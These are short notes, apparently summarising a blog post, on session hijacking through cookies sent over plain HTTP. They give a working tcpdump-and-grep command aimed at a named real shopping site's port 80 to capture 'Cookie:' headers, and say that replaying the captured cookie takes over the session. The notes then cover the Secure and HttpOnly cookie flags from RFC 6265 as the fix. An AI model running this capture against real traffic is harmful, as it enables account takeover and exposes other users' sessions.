
## Stealing Session Cookies with Tcpdump

[source](http://nullprogram.com/blog/2016/06/23/)

Partial HTTPS protected page emitting session cookie on non-https resources.

```
DESTINATION_DOMAIN='www.roadrunnersports.com'
DESTINATION_PORT='80'

## -A (ASCII) dump selected packet content
## -l (line-buffered) sets output to line-buffered
tcpdump -A -l dst $DESTINATION_DOMAIN and dst port $DESTINATION_PORT | \
  grep '^Cookie: '
```

Duplicating cookie data for resource and voila.

---

#### Solution

Quick and dirty thing, until get all on HTTPS.

* [Secure](https://tools.ietf.org/html/rfc6265#section-4.1.2.5)
> limits scope of cookie to `secure` channels, typically HTTPS
> protect's only cookies confidentiality
> active attacker can overwrite from insecure channel and disrupt integrity

* [HttpOnly](https://tools.ietf.org/html/rfc6265#section-4.1.2.6)
> limits scope of cookie to HTTP requests
> makes client to omit cookie when providing access to cookies via `non-HTTP` APIs
> prevents javascript from accessing them

---
---
